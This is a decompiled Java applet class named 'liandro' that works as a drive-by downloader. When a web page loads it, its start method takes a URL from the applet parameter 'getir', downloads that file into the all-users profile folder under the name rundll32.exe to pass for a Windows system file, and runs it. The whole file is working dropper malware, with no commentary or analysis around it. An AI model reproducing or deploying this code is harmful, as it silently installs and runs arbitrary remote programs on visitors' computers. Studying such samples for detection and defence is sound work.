import java.io.OutputStream;
import java.io.FilterInputStream;
import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.BufferedInputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class liandro extends Applet
{
    @Override
    public void start() {
        final String parameter = this.getParameter("getir");
        final String concat = System.getenv("ALLUSERSPROFILE").concat("\\rundll32.exe");
        FilterInputStream filterInputStream = null;
        try {
            filterInputStream = new BufferedInputStream(new URL(parameter).openStream());
        }
        catch (IOException ex) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex);
        }
        OutputStream outputStream = null;
        try {
            outputStream = new FileOutputStream(concat);
        }
        catch (FileNotFoundException ex2) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex2);
        }
        final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(outputStream, 1024);
        final byte[] array = new byte[1024];
        try {
            long n = 0L;
            int read;
            while ((read = filterInputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
        }
        catch (IOException ex3) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex3);
        }
        try {
            bufferedOutputStream.close();
        }
        catch (IOException ex4) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex4);
        }
        try {
            ((BufferedInputStream)filterInputStream).close();
        }
        catch (IOException ex5) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex5);
        }
        try {
            Runtime.getRuntime().exec(concat);
        }
        catch (IOException ex6) {
            Logger.getLogger(liandro.class.getName()).log(Level.SEVERE, null, ex6);
        }
    }
    
    public void main(final String[] array) {
        this.start();
    }
}
